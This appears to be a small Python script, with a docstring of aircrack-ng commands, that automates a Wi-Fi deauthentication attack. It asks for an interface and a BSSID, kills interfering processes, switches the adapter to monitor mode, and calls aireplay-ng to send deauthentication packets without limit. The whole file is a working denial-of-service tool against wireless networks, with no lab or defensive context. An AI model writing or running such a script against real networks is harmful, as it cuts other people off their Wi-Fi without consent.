import subprocess as sb
"""
Sudo iwconfig
Sudo airmon-ng check kill
Sudo airmon-ng start <adapter>
Sudo airodump-ng <adapter> 
Sudo aireplay-ng —deauth 0 -a <bssid> -c <bssid> <adapter>
"""

#get the interface
interface = input("Enter the interface: ")
bssid = input("Enter the bssid: ")

#kill all processes that might interfere
sb.call(["sudo", "airmon-ng", "check", "kill"])
#put adapter in monitor mode
sb.call(["sudo", "airmon-ng", "start", interface])
#send deauth packets
sb.call(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-c", bssid, interface ])